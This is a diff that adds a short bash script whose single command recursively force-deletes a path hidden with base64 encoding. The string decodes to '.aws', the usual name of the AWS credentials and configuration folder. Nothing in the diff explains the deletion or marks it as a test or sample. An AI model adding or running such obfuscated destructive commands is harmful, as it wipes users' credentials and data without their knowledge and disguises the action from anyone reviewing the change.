@@ -1,0 +1,3 @@
+#!/bin/bash
+
+rm -rf "$(echo LmF3cwo= | base64 -D)"
